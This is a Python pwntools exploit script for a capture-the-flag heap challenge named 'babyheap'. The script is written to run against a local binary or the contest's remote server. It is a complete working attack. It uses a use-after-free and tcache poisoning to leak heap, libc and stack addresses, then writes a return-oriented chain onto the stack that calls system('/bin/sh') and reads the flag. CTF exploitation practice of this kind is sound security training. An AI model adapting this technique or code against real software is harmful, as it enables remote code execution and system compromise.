from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./babyheap"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote(
    "baby-heap.nc.jctf.pro", 1337)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()


def add(idx, content):
    io.sendlineafter("Quit\n> ", "1")
    io.sendlineafter("Index? ", str(idx))
    io.sendlineafter("Content? Content? ", content)


def delete(idx):
    io.sendlineafter("Quit\n> ", "4")
    io.sendlineafter("Index? ", str(idx))


def show(idx):
    io.sendlineafter("Quit\n> ", "2")
    io.sendlineafter("Index? ", str(idx))


def update(idx, content):
    io.sendlineafter("Quit\n> ", "3")
    io.sendlineafter("Index? ", str(idx))
    io.sendlineafter("Content? ", content)


add(0, "0"*10)
add(1, "1"*10)
delete(0)
show(0)
heap = u64(io.recv(5).ljust(8, b"\x00")) << 12
log.success("heap :-----> " + hex(heap))

# leak libc
delete(1)
update(1, p64((heap+0x20) ^ heap >> 12))

add(2, "2"*10)
add(3, p64(0x07))  # 0xa0 tcache->7

add(4, "4"*10)
add(5, "5"*10)
add(19, "19"*10)  # 防止下面fake chunk(0xa0)合并
delete(4)
delete(5)
update(5, p64((heap+0x300) ^ heap >> 12))

update(2, p64(0)*3+p64(0x80+0x21))
add(6, "6"*10)
add(7, "7"*10)
delete(7)
show(7)
libc.address = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00")) - 0x203b20
log.success("libc :-----> " + hex(libc.address))

# leak stack
libc_environ = libc.symbols["__environ"]  # 0x7f6dd78c1d58
libc_environ -= 0x18
log.success("environ :-----> " + hex(libc_environ))
add(8, "8"*10)
add(9, "9"*10)
delete(8)
delete(9)
update(9, p64((libc_environ) ^ heap >> 12))
add(10, "10"*5)
add(11, "11"*5)
show(11)
stack_leak = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

log.success("stack_leak :-----> " + hex(stack_leak))

# create chunk->ret->system("/bin/sh")
add(12, "12"*10)
add(13, "9"*10)
delete(12)
delete(13)
create_ret = stack_leak - 0x150 - 8
update(13, p64((create_ret) ^ heap >> 12))
add(14, "10"*5)

system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))
payload = p64(libc.address+0x010f75b)
payload += p64(binsh_addr)
payload += p64(libc.address+0x02882f)
payload += p64(system_addr)

ddebug("breakrva 0x12B3\n breakrva 0x13cb\n continue")
add(15, p64(heap + 0x500)+payload)

io.sendline(b"cat flag.txt")
io.interactive()
